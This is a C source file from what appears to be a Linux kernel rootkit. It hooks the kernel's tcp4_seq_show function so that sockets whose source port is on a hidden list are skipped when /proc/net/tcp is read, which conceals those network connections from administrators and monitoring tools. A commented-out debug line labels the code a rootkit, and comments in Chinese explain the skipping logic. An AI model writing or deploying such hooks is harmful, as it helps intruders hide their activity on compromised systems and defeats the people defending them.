//
// Created by black on 22-10-19.
//

#include "port.h"
#include "hook.h"
#include "data.h"
#include <linux/tcp.h>

static int (*origin_tcp4_seq_show)(struct seq_file *seq, void *v);


long HookTcp4SeqShow(struct pt_regs *regs, long (*pFunction)(const struct pt_regs *)) {
    origin_tcp4_seq_show = (int (*)(struct seq_file *, void *)) pFunction;
    jump_func = (volatile unsigned long) AfterJumpInTcp4SeqShow;
    return 1;
}


// /proc/net/tcp 文件还没有隐藏
int AfterJumpInTcp4SeqShow(struct seq_file *seq, void *v) {
    struct inet_sock *is;
    long ret;

    struct List temp;
    if (v != SEQ_START_TOKEN) {
        is = (struct inet_sock *) v;
        temp.inode_or_port = ntohs(is->inet_sport);

        //端口是否在hidePort中
        if (ListContainsInode(temp, &port_list)) {
            pr_info("Detect source port: %d\n", ntohs(is->inet_sport));
//            printk(KERN_DEBUG "rootkit: sport: %d, dport: %d\n",
//                   ntohs(is->inet_sport), ntohs(is->inet_dport));
            //返回零跳过系统处理
            return 0;
        }
    }

    return origin_tcp4_seq_show(seq, v);
}
